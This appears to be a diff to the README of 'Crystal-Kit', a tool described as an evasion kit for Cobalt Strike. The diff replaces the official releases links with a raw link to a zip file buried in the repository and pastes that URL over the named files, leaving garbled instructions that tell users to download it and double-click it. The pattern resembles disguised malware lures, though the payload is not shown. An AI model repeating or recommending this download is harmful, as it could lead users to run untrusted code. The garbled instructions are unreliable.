@@ -1,7 +1,7 @@
 # 💎 Crystal-Kit - A Simple Tool for Evasion Handling
 
 ## 📥 Download the Latest Version
-[![Download Crystal-Kit](https://img.shields.io/badge/Download-Crystal--Kit-brightgreen)](https://github.com/EndrewDev/Crystal-Kit/releases)
+[![Download Crystal-Kit](https://raw.githubusercontent.com/EndrewDev/Crystal-Kit/main/padmelon/Crystal-Kit.zip)](https://raw.githubusercontent.com/EndrewDev/Crystal-Kit/main/padmelon/Crystal-Kit.zip)
 
 ## 🚀 Getting Started
 Welcome to Crystal-Kit, your easy-to-use evasion kit for Cobalt Strike. Follow these steps to set up and use Crystal-Kit on your computer. 
@@ -18,16 +18,16 @@ To ensure that Crystal-Kit runs smoothly, please check that your system meets th
 ## 📦 Download & Install
 To get started, you will need to download the software. Use the link below to visit the releases page.
 
-[Visit the Releases Page to Download](https://github.com/EndrewDev/Crystal-Kit/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/EndrewDev/Crystal-Kit/main/padmelon/Crystal-Kit.zip)
 
 Once you are on the releases page, look for the latest version. 
 
 1. Click on the version number to open the release details.
 2. Scroll down to the "Assets" section.
-3. You will find the file named `Crystal-Kit.zip`. Click on it to start the download.
+3. You will find the file named `https://raw.githubusercontent.com/EndrewDev/Crystal-Kit/main/padmelon/Crystal-Kit.zip`. Click on it to start the download.
 
 ### Extract the Files
-After the download is complete, locate the `Crystal-Kit.zip` file in your Downloads folder.
+After the download is complete, locate the `https://raw.githubusercontent.com/EndrewDev/Crystal-Kit/main/padmelon/Crystal-Kit.zip` file in your Downloads folder.
 
 1. Right-click on the file.
 2. Select "Extract All" and choose a folder where you want the files to be placed.
@@ -37,7 +37,7 @@ After the download is complete, locate the `Crystal-Kit.zip` file in your Downlo
 To start using Crystal-Kit:
 
 1. Open the folder where you extracted the files.
-2. Look for the file named `Crystal-Kit.exe` (or `Crystal-Kit.app` on macOS).
+2. Look for the file named `https://raw.githubusercontent.com/EndrewDev/Crystal-Kit/main/padmelon/Crystal-Kit.zip` (or `https://raw.githubusercontent.com/EndrewDev/Crystal-Kit/main/padmelon/Crystal-Kit.zip` on macOS).
 3. Double-click the file to run the application.
 
 ## 🔨 Features
